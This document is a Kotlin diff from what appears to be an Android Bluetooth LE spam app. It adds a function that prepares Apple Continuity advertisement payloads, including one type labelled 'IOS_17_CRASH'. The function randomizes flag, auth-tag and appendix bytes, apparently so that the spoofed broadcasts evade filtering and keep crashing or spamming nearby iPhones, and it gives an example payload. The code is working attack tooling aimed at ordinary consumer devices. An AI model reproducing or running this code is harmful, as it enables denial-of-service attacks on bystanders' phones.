@@ -6,8 +6,11 @@ import android.util.Log
 import de.simon.dankelmann.bluetoothlespam.AppContext.AppContext
 import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementError
 import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementQueueMode
+import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementSetType
 import de.simon.dankelmann.bluetoothlespam.Enums.TxPowerLevel
 import de.simon.dankelmann.bluetoothlespam.Helpers.QueueHandlerHelpers
+import de.simon.dankelmann.bluetoothlespam.Helpers.StringHelpers
+import de.simon.dankelmann.bluetoothlespam.Helpers.StringHelpers.Companion.toHexString
 import de.simon.dankelmann.bluetoothlespam.Interfaces.Callbacks.IAdvertisementServiceCallback
 import de.simon.dankelmann.bluetoothlespam.Interfaces.Callbacks.IAdvertisementSetQueueHandlerCallback
 import de.simon.dankelmann.bluetoothlespam.Interfaces.Services.IAdvertisementService
@@ -185,10 +188,46 @@ class  AdvertisementSetQueueHandler :IAdvertisementServiceCallback{
     fun advertiseNextAdvertisementSet(){
         selectNextAdvertisementSet()
         if(_currentAdvertisementSet != null){
-            handleAdvertisementSet(_currentAdvertisementSet!!)
+            handleAdvertisementSet(prepareAdvertisementSet(_currentAdvertisementSet!!))
         } else {
             Log.e(_logTag, "Current Advertisement Set is null.")
         }
+    }
+
+    fun prepareAdvertisementSet(advertisementSet: AdvertisementSet):AdvertisementSet{
+
+        if(advertisementSet.type == AdvertisementSetType.ADVERTISEMENT_TYPE_CONTINUITY_IOS_17_CRASH || advertisementSet.type == AdvertisementSetType.ADVERTISEMENT_TYPE_CONTINUITY_ACTION_MODALS){
+           if(advertisementSet.advertiseData.manufacturerData.size > 0){
+               var payload = advertisementSet.advertiseData.manufacturerData[0].manufacturerSpecificData
+               // Example Payload: 0f05bf2078ef39000010f7c0e5
+               val action = payload[3]
+               var flag = payload[2]
+
+               if((action.toHexString() == "20") && Random.nextBoolean()){
+                   flag = StringHelpers.decodeHex("BF")[0]
+               }
+
+               if((action.toHexString() == "09") && Random.nextBoolean()){
+                   flag = StringHelpers.decodeHex("40")[0]
+               }
+               payload[2] = flag
+
+               // randomize auth tag
+               payload[4] = Random.nextBytes(1)[0]
+               payload[5] = Random.nextBytes(1)[0]
+               payload[6] = Random.nextBytes(1)[0]
+
+               if(advertisementSet.type == AdvertisementSetType.ADVERTISEMENT_TYPE_CONTINUITY_IOS_17_CRASH){
+                   // randomize appendix
+                   payload[10] = Random.nextBytes(1)[0]
+                   payload[11] = Random.nextBytes(1)[0]
+                   payload[12] = Random.nextBytes(1)[0]
+               }
+
+           }
+        }
+
+        return advertisementSet
     }
 
     fun selectNextAdvertisementSet(){
